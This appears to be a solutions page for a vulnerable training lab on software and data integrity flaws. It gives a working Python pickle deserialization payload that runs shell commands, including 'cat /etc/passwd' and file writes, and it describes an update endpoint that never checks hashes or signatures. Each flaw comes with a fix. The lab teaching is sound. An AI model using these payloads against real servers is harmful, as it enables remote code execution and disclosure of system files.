# A08 – Software & Data Integrity: Solutions

## Challenge 1 – Pickle RCE

### Step 1: Generate the payload
Go to `/a08/generate-payload`, enter command `id`, copy the base64 output.

Or via Python:
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Step 2: Send to /a08/deserialize
Paste the base64 string and click Deserialize.
The server executes `os.system('id')` and you see the result.

More impactful payloads (for lab use only):
```python
# List files
return (os.system, ('ls /tmp',))

# Write a file
return (os.system, ('touch /tmp/pwned_by_pickle',))

# Read sensitive file
return (os.popen, ('cat /etc/passwd',))
```

**Fix:** Never deserialize untrusted data. Use JSON for data exchange.
If you must serialize Python objects, use `hmac` to sign the payload
and verify before deserializing.

## Challenge 2 – Unsigned Update
Navigate to `/a08/update` and apply any version.
The `sha256` and `signature` fields are `None` — never checked.

**Fix:**
```python
import hashlib, requests

resp = requests.get(manifest['url'])
actual_hash = hashlib.sha256(resp.content).hexdigest()
if actual_hash != manifest['sha256']:
    raise ValueError("Update integrity check failed!")
# Also verify GPG signature for critical components
```
